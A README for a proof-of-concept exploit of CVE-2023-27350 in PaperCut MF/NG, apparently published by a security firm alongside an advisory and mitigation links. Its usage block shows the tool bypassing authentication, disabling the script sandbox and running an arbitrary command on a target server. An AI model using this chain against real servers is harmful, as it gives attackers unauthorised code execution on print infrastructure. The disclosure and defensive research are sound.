# CVE-2023-27350
POC for CVE-2023-27350 affecting PaperCut MF/NG

## Technical Analysis
A technical root cause analysis of the vulnerability, indicators of compromise, and internet exposure can be found on our blog:
https://www.horizon3.ai/papercut-cve-2023-27350-deep-dive-and-indicators-of-compromise

## Summary
This POC uses an authentication bypass vulnerability chained with abuse of builtin scripting functionality to execute code.

## Usage
```plaintext
python3 CVE-2023-27350.py --url 'http://10.0.40.56:9191' --command calc.exe
[*] Papercut instance is vulnerable! Obtained valid JSESSIONID
[*] Updating print-and-device.script.enabled to Y
[*] Updating print.script.sandboxed to N
[*] Prepparing to execute...
[+] Executed successfully!
[*] Updating print-and-device.script.enabled to N
[*] Updating print.script.sandboxed to Y
```

## Mitigations
Update to the latest version or mitigate by following the instructions within the PaperCut Security Advisory
* https://www.papercut.com/kb/Main/PO-1216-and-PO-1219

## Follow the Horizon3.ai Attack Team on Twitter for the latest security research:
*  [Horizon3 Attack Team](https://twitter.com/Horizon3Attack)
*  [James Horseman](https://twitter.com/JamesHorseman2)
*  [Zach Hanley](https://twitter.com/hacks_zach)

## Disclaimer
This software has been created purely for the purposes of academic research and for the development of effective defensive techniques, and is not intended to be used to attack systems except where explicitly authorized. Project maintainers are not responsible or liable for misuse of the software. Use responsibly.
